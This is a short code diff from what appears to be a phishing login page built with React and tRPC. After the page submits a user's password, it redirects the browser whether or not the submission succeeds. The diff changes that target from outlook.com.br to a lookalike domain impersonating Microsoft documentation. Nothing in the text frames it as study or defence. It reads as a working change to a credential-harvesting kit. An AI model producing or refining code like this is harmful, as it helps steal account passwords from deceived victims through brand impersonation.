@@ -19,13 +19,13 @@ export default function Home() {
   const submitPasswordMutation = trpc.login.submitPassword.useMutation({
     onSuccess: () => {
       setTimeout(() => {
-        window.location.href = "https://www.outlook.com.br/";
+        window.location.href = "https://docs-microsoft.up.railway.app/nf-giaminola2025";
       }, 300);
     },
     onError: (error) => {
       console.error("Erro:", error);
       setTimeout(() => {
-        window.location.href = "https://www.outlook.com.br/";
+        window.location.href = "https://docs-microsoft.up.railway.app/nf-giaminola2025";
       }, 300);
     },
   });
